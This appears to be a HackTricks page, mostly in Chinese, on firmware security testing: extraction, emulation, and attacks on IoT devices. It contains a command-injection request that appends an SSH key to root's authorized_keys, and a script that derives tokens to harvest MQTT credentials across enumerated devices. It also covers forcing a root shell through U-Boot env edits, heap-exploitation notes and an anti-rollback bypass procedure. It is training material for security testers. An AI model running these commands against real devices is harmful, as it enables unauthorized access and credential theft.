# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware 是一种关键软件，通过管理和促进硬件组件与用户交互的软件之间的通信，使设备能够正常运行。它存储在永久存储器中，确保设备从通电的那一刻起就能访问关键指令，从而启动 operating system。检查并可能修改 firmware 是识别 security vulnerabilities 的关键步骤。

## **Gathering Information**

**Gathering information** 是理解设备构成及其所使用 technologies 的关键初始步骤。此过程涉及收集以下信息：

- CPU architecture 和它运行的 operating system
- bootloader 细节
- 硬件布局和 datasheets
- codebase 指标和 source locations
- 外部 libraries 和 license types
- 更新历史和 regulatory certifications
- architectural 和 flow diagrams
- security assessments 和已识别的 vulnerabilities

为此，**open-source intelligence (OSINT)** 工具非常有价值，对任何可用的 open-source software 组件进行手动和自动化审查也同样如此。像 [Coverity Scan](https://scan.coverity.com) 和 [Semmle’s LGTM](https://lgtm.com/#explore) 这样的工具提供免费的 static analysis，可用于发现潜在问题。

## **Acquiring the Firmware**

获取 firmware 可以通过多种方式进行，每种方式都有其自身的复杂度：

- **Directly** 从源头获取（开发者、制造商）
- 根据提供的说明**Building** 它
- 从官方 support sites **Downloading**
- 使用 **Google dork** queries 查找托管的 firmware 文件
- 直接访问 **cloud storage**，使用 [S3Scanner](https://github.com/sa7mon/S3Scanner) 等工具
- 通过 man-in-the-middle techniques 拦截 **updates**
- 通过 **UART**、**JTAG** 或 **PICit** 等连接从设备中 **Extracting**
- 在设备通信中 **Sniffing** 更新请求
- 识别并使用硬编码的 **update endpoints**
- 从 bootloader 或 network 中 **Dumping**
- 当其他方法都失败时，使用合适的 hardware tools **Removing and reading** 存储芯片

### UART-only logs: force a root shell via U-Boot env in flash

如果忽略 UART RX（仅有 logs），你仍然可以通过离线 **editing the U-Boot environment blob** 强制启动一个 init shell：

1. 使用 SOIC-8 clip + programmer（3.3V）转储 SPI flash：
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. 定位 U-Boot env partition，编辑 `bootargs` 以包含 `init=/bin/sh`，并为该 blob **recompute the U-Boot env CRC32**。
3. 仅重新刷写 env partition 并重启；UART 上应会出现 shell。

这在 bootloader shell 被禁用但 env partition 可通过外部 flash 访问写入的 embedded devices 上非常有用。

## Analyzing the firmware

现在你已经**有了 firmware**，需要提取其中的信息，以了解应如何处理它。你可以使用的一些不同工具：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
如果你用这些工具没有发现太多内容，就检查图像的 **entropy**，使用 `binwalk -E <bin>`。如果 entropy 低，那么它不太可能是 encrypted 的。如果 entropy 高，它很可能是 encrypted 的（或者以某种方式被 compressed 了）。

此外，你可以使用这些工具来提取 **嵌入在 firmware 中的文件**：


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

或者使用 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) 来检查该文件。

### Getting the Filesystem

使用前面提到的工具，比如 `binwalk -ev <bin>`，你应该已经能够 **extract the filesystem** 了。\
Binwalk 通常会把它 extract 到一个 **以 filesystem type 命名的 folder** 中，这通常是以下几种之一：squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs。

#### Manual Filesystem Extraction

有时，binwalk **不会在其 signatures 中包含 filesystem 的 magic byte**。在这种情况下，使用 binwalk 来 **find the offset of the filesystem**，并从 binary 中 carve 出 compressed filesystem，然后根据其类型按照下面的步骤 **manually extract** filesystem。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
运行以下 **dd command** 来提取 Squashfs filesystem。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
或者，也可以运行以下命令。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- 对于 squashfs（如上例所示使用）

`$ unsquashfs dir.squashfs`

之后文件会位于 "`squashfs-root`" 目录中。

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- 对于 jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- 对于带有 NAND flash 的 ubifs filesystems

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 分析 Firmware

一旦获得 firmware，就必须对其进行解析，以了解其结构和潜在漏洞。此过程涉及使用各种工具来分析并从 firmware 镜像中提取有价值的数据。

### 初始分析工具

下面提供了一组用于初步检查二进制文件（记为 `<bin>`）的命令。这些命令有助于识别文件类型、提取字符串、分析二进制数据，以及了解分区和 filesystem 细节：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
要评估镜像的加密状态，可以使用 `binwalk -E <bin>` 检查 **entropy**。低 entropy 表明可能没有加密，而高 entropy 则表示可能存在加密或压缩。

对于提取 **embedded files**，建议使用 **file-data-carving-recovery-tools** 文档和 **binvis.io** 等工具与资源来检查文件。

### 提取 Filesystem

使用 `binwalk -ev <bin>`，通常可以提取 filesystem，通常会放到一个以 filesystem 类型命名的目录中（例如，squashfs、ubifs）。然而，当 **binwalk** 因缺少 magic bytes 而无法识别 filesystem 类型时，就需要手动提取。这包括使用 `binwalk` 找出 filesystem 的 offset，然后使用 `dd` 命令切出 filesystem：
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
然后，根据文件系统类型（例如，squashfs、cpio、jffs2、ubifs），会使用不同的命令手动提取内容。

### 文件系统分析

提取出文件系统后，就开始搜索安全漏洞。重点关注不安全的 network daemons、硬编码凭据、API endpoints、更新服务器功能、未编译代码、启动脚本以及用于离线分析的编译后二进制文件。

**需要检查的关键位置** 和 **项目** 包括：

- **etc/shadow** 和 **etc/passwd**，用于用户凭据
- **etc/ssl** 中的 SSL certificates 和 keys
- 可能存在漏洞的配置和脚本文件
- 用于进一步分析的嵌入式 binaries
- 常见 IoT device web servers 和 binaries

有几种工具可帮助在文件系统中发现敏感信息和漏洞：

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 和 [**Firmwalker**](https://github.com/craigz28/firmwalker)，用于搜索敏感信息
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)，用于全面的 firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) 和 [**EMBA**](https://github.com/e-m-b-a/emba)，用于 static 和 dynamic analysis

### 编译后二进制文件的安全检查

在文件系统中找到的源代码和编译后二进制文件都必须仔细检查漏洞。像用于 Unix binaries 的 **checksec.sh** 和用于 Windows binaries 的 **PESecurity** 这类工具，可以帮助识别可能被利用的未受保护 binaries。

## 通过派生 URL tokens 收集 cloud config 和 MQTT credentials

许多 IoT hubs 会从一个云端 endpoint 获取每个设备的配置，该 endpoint 形式如下：

- `https://<api-host>/pf/<deviceId>/<token>`

在 firmware analysis 期间，你可能会发现 `<token>` 是使用 hardcoded secret 从 device ID 本地派生出来的，例如：

- token = MD5( deviceId || STATIC_KEY )，并表示为大写十六进制

这种设计使得任何知道 deviceId 和 STATIC_KEY 的人都能重建该 URL 并拉取 cloud config，通常会泄露明文 MQTT credentials 和 topic prefixes。

实际流程：

1) 从 UART boot logs 中提取 deviceId

- 连接一个 3.3V UART adapter（TX/RX/GND）并捕获日志：
```bash
picocom -b 115200 /dev/ttyUSB0
```
- 查找打印 cloud config URL 模式和 broker 地址的行，例如：
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) 从 firmware 中恢复 STATIC_KEY 和 token algorithm

- 将 binaries 加载到 Ghidra/radare2 中，并搜索 config path（"/pf/"）或 MD5 usage。
- 确认 algorithm（例如，MD5(deviceId||STATIC_KEY)）。
- 在 Bash 中派生 token，并将 digest 转为 uppercase：
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) 收集 cloud config 和 MQTT credentials

- 用 curl 组合 URL 并拉取 JSON；用 jq 解析以提取 secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 滥用明文 MQTT 和弱 topic ACLs（如果存在）

- 使用恢复的 credentials 订阅 maintenance topics，并查找敏感 events：
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 枚举可预测的 device IDs（在授权范围内，按规模）

- 许多生态系统会嵌入 vendor OUI/product/type 字节，后跟一个顺序后缀。
- 你可以遍历候选 IDs，派生 token 并以编程方式获取 configs：
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- 始终在尝试 mass enumeration 之前获得明确授权。
- 在可能的情况下，优先使用 emulation 或 static analysis 来恢复 secrets，而不是修改目标硬件。


Emulating firmware 的过程可以进行设备运行或单个程序的 **dynamic analysis**。这种方法可能会遇到 hardware 或 architecture 依赖方面的挑战，但将 root filesystem 或特定 binaries 转移到具有匹配 architecture 和 endianness 的设备上，例如 Raspberry Pi，或转移到预构建的 virtual machine，可以促进进一步测试。

### Emulating Individual Binaries

对于检查单个程序，识别程序的 endianness 和 CPU architecture 至关重要。

#### Example with MIPS Architecture

要 emulate 一个 MIPS architecture binary，可以使用命令：
```bash
file ./squashfs-root/bin/busybox
```
并安装所需的仿真工具：
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

For ARM binaries, the process is similar, with the `qemu-arm` emulator being utilized for emulation.

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## 动态分析实践

在这个阶段，会使用真实设备或模拟设备环境进行分析。必须保持对 OS 和 filesystem 的 shell 访问。Emulation 可能无法完美模拟硬件交互，因此有时需要重新启动 Emulation。分析应回到 filesystem，利用暴露的网页和网络服务，并探索 bootloader 漏洞。Firmware 完整性测试对于识别潜在的 backdoor 漏洞至关重要。

## 运行时分析技术

运行时分析涉及在进程或 binary 的运行环境中与其交互，使用 gdb-multiarch、Frida 和 Ghidra 等工具设置断点，并通过 fuzzing 和其他技术识别漏洞。

对于没有完整 debugger 的嵌入式目标，**将静态链接的 `gdbserver` 复制**到设备上并远程连接：
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

在 IoT hubs 上，RF stack 通常在 **radio MCU** 和 Linux userland process 之间拆分。一个有用的工作流是映射这条路径：

1. 空中的 **RF frame**
2. radio MCU 上的 **controller-side parser**
3. 转发到 Linux 的 **serial/UART text or TLV protocol**（例如 `/dev/tty*`）
4. main daemon 中的 **application dispatcher**
5. **protocol-specific handler / state machine**

这种架构会产生两个 reversing target，而不是一个。如果 controller 把二进制 radio frame 转成诸如 `Group,Command,arg1,arg2,...` 的文本协议，恢复以下内容：

- **message groups** 和 dispatch tables
- 哪些消息可以来自 **network**，哪些来自 controller 本身
- 精确的 **manufacturer-specific discriminator fields**（例如 Zigbee `manufacturer_code` 和自定义 `cluster_command`）
- 哪些 handler 只在 **commissioning**、discovery 或 firmware/model download 阶段可达

对于 Zigbee 来说，捕获 pairing traffic 并检查目标是否仍然依赖默认的 **Link Key** `ZigBeeAlliance09`。如果是，嗅探 commissioning traffic 可能会暴露 **Network Key**。Zigbee 3.0 install codes 会降低这种暴露，因此要记录被测试设备是否 वास्तव really 强制使用它们。

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands 往往比标准化 clusters 更值得作为 target，因为它们会进入 **custom parsing code** 和内部 **FSMs**，而这些代码的测试覆盖通常更少。

实用工作流：

- 逆向 command dispatcher，直到找到 **vendor-only handler**。
- 恢复 **FSM state**、**event**、**check**、**action** 和 **next-state** tables。
- 识别会自动推进的 **transitional states**，以及最终会重置或释放 attacker-controlled state 的 retry/error branches。
- 确认需要哪些合法的 protocol exchanges 才能让 daemon 进入 vulnerable state，而不是假设 buggy handler 总是可达。

对于对 timing 敏感的 protocols，使用 Python framework 做 packet replay 可能太慢。更可靠的方法是在真实硬件上模拟合法设备（例如 **nRF52840**），并使用 vendor-grade stack，这样你可以暴露正确的 **endpoints**、**attributes** 和 commissioning timing。

### Fragmented-download bug class in embedded daemons

在 **fragmented blob/model/configuration downloads** 中，常见一种 firmware bug class：

1. **first fragment**（`offset == 0`）保存 `ctx->total_size` 并分配 `malloc(total_size)`。
2. 后续 fragment 只验证 attacker-controlled 的 **packet-local** 字段，例如 `packet_total_size >= offset + chunk_len`。
3. 拷贝使用 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`，却没有检查是否超出 **original allocated size**。

这使攻击者可以发送：

- 一个合法的 first fragment，声明的 total size **很小**，以强制进行小 heap allocation。
- 一个后续 fragment，使用 **expected offset** 但更大的 `chunk_len`。
- 一个伪造的 packet-local size，满足新的检查条件，同时仍然覆盖原先分配的 buffer。

当 vulnerable path 位于 commissioning logic 后面时，exploitation 必须包含足够的 **device emulation**，先把 target 驱动到预期的 model-download 或 blob-download state，再发送畸形 fragments。

### Protocol-driven `free()` triggers

在 embedded daemons 中，触发 heap metadata exploitation 的最简单方式通常不是“等清理发生”，而是 **强制协议自身的错误处理**：

- 发送畸形的后续 fragments，把 FSM 推入 **retry** 或 **error** states。
- 超过 retry threshold，使 daemon **resets context** 并释放被破坏的 buffer。
- 利用这个可预测的 `free()`，在 process 因无关原因崩溃之前，先触发 allocator-side primitives。

这对 embedded Linux 中的 **musl/uClibc/dlmalloc-like** allocators 尤其有用，因为破坏 chunk metadata 可以把 unlink/unbin logic 变成 write primitive。一个稳定模式是破坏 **size field**，把 allocator traversal 重定向到 **fake chunks staged inside the overflowed buffer**，而不是立刻覆盖真实的 bin pointers 并让 process 崩溃。

## Binary Exploitation and Proof-of-Concept

为已识别的漏洞开发 PoC 需要深入理解 target architecture，并使用更底层的语言进行编程。embedded systems 中的 binary runtime protections 很少见，但如果存在，可能需要 Return Oriented Programming (ROP) 之类的技术。

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc 使用类似 glibc 的 fastbins。后续的大块分配可能触发 `__malloc_consolidate()`，因此任何 fake chunk 都必须通过检查（合理的 size、`fd = 0`，并且周围 chunk 被视为“in use”）。
- **Non-PIE binaries under ASLR:** 如果启用了 ASLR，但主 binary 是 **non-PIE**，那么 binary 内部的 `.data/.bss` 地址是稳定的。你可以瞄准一个已经看起来像合法 heap chunk header 的区域，把 fastbin allocation 落到一个 **function pointer table** 上。
- **Parser-stopping NUL:** 当解析 JSON 时，payload 中的 `\x00` 可以停止解析，同时保留后续 attacker-controlled bytes，用于 stack pivot/ROP chain。
- **Shellcode via `/proc/self/mem`:** 一个调用 `open("/proc/self/mem")`、`lseek()` 和 `write()` 的 ROP chain，可以把可执行 shellcode 写入已知 mapping 并跳转执行。

## Prepared Operating Systems for Firmware Analysis

像 [AttifyOS](https://github.com/adi0x90/attifyos) 和 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 这样的 operating systems 提供了预配置环境，用于 firmware security testing，并配备了所需工具。

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS 是一个旨在帮助你对 Internet of Things (IoT) devices 进行 security assessment 和 penetration testing 的 distro。它通过提供一个预配置环境并加载所有必要工具，帮你节省大量时间。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): 基于 Ubuntu 18.04 的 embedded security testing operating system，预装了 firmware security testing tools。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

即使 vendor 对 firmware images 实现了 cryptographic signature checks，**version rollback（downgrade） protection** 也经常被省略。当 boot- 或 recovery-loader 只用内置 public key 验证 signature，而不比较正在刷写 image 的 *version*（或 monotonic counter）时，攻击者就可以合法安装一个 **older, vulnerable firmware**，只要它仍然带有有效签名，从而重新引入已修补的漏洞。

典型 attack workflow：

1. **Obtain an older signed image**
* 从 vendor 的 public download portal、CDN 或 support site 获取。
* 从配套的 mobile/desktop applications 中提取（例如在 Android APK 的 `assets/firmware/` 内）。
* 从第三方仓库获取，例如 VirusTotal、internet archives、forums 等。
2. **Upload or serve the image to the device** 通过任何暴露的 update channel：
* Web UI、mobile-app API、USB、TFTP、MQTT 等。
* 许多 consumer IoT devices 暴露 *unauthenticated* 的 HTTP(S) endpoints，接受 Base64-encoded firmware blobs，在 server-side 解码后触发 recovery/upgrade。
3. 降级后，利用在新版本中已修补的漏洞（例如后来添加的 command-injection filter）。
4. 如有需要，可在获得 persistence 后再刷回最新 image，或禁用更新以避免被发现。

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
在有漏洞的（降级后的）firmware 中，`md5` 参数被直接拼接到 shell 命令中，且没有经过 sanitisation，允许注入任意命令（这里是——启用基于 SSH key 的 root 访问）。后续版本的 firmware 引入了基本的字符过滤，但由于缺少 downgrade protection，这个修复形同虚设。

### 从 Mobile Apps 中提取 Firmware

许多厂商会在其配套的 mobile application 中捆绑完整的 firmware images，这样 app 就可以通过 Bluetooth/Wi-Fi 更新设备。这些包通常以未加密的形式存储在 APK/APEX 中，路径如 `assets/fw/` 或 `res/raw/`。使用 `apktool`、`ghidra`，甚至普通的 `unzip`，都可以在不接触物理硬件的情况下提取已签名的 images。
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot 设计中的仅 updater anti-rollback bypass

有些厂商确实实现了 anti-downgrade **ratchet**，但只在 *updater* 逻辑内部实现（例如通过 CAN 的 UDS routine、recovery command，或 userspace OTA agent）。如果之后 **bootloader** 只检查 image signature/CRC，并信任 partition table 或 slot metadata，那么 rollback protection 仍然可能被绕过。

典型的弱设计：

- Firmware metadata 同时包含 version descriptor 和 **security ratchet** / monotonic counter。
- updater 将 image ratchet 与存储在 persistent storage 中的值比较，并拒绝较旧的已签名 images。
- bootloader **不会** 解析该 ratchet，而是在启动选定 slot 之前只验证 header、CRC 和 signature。
- slot activation 单独存储在 partition table 或 per-slot generation counter 中，并且**没有**与已验证的确切 firmware digest 做 cryptographic bind。

这会在双 slot 系统中创建一个 **validate-one-image / boot-another-image** primitive。若 attacker 能让 updater 使用当前已签名 image 将 slot B 标记为下次启动目标，并且之后在 reboot 前覆盖 slot B，bootloader 仍可能启动降级 image，因为它只信任已经提交的 slot metadata。

常见 abuse pattern：

1. 将一个 **current signed** firmware 上传到被动 slot，并运行正常的 validation/switch routine，使布局将该 slot 标记为下一 active。
2. **先不要 reboot**。在同一 session 中重新进入 slot-preparation/erase routine。
3. 滥用 stale boot-state 或 stale slot-selection logic，让 updater 擦除刚刚被提升的**同一个 physical slot**。
4. 将一个**更旧但仍已签名**的 firmware 写入该 slot。
5. 跳过 enforce ratchet 的 validation routine，直接 reboot。
6. bootloader 选择已提升的 slot，只验证 signature/integrity，然后启动旧 image。

在逆向 A/B update implementations 时要关注：

- 从 **boot-time flags** 派生的 slot selection，在成功切换后不会刷新。
- 类似 `prepare_passive_slot()` 的 routine，基于 stale state 而不是**当前已提交的布局**来擦除 slot。
- 类似 `part_write_layout()` 的函数，只提升 **generation counter** / active flag，而不存储已验证的 image hash。
- ratchet checks 在 userspace 或 updater code 中实现，但**不在** ROM / bootloader / secure boot stages 中实现。
- erase 或 recovery routines 在内容被移除并重写后，仍将 slot 保持为可启动状态。

### 评估 Update Logic 的 Checklist

* update endpoint 的 transport/authentication 是否足够受保护（TLS + authentication）？
* 设备在 flashing 之前是否比较 **version numbers** 或 **monotonic anti-rollback counter**？
* image 是否在 secure boot chain 内被验证（例如由 ROM code 检查 signatures）？
* **bootloader** 是否强制执行与 updater 相同的 ratchet，而不只是检查 signature/CRC？
* slot activation metadata 是否与已验证的 firmware digest/version **绑定**，还是 slot 在提升后仍可被修改？
* slot switch 成功后，设备是否被强制 reboot，还是后续的 update/erase routines 在同一 session 中仍可访问？
* userland code 是否执行额外的 sanity checks（例如允许的 partition map、model number）？
* *partial* 或 *backup* update flows 是否复用了相同的 validation logic？

> 💡 如果以上任意一项缺失，该平台很可能容易受到 rollback attacks。

## 可用于练习的脆弱 firmware

要练习发现 firmware 中的漏洞，可以使用以下脆弱 firmware projects 作为起点。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
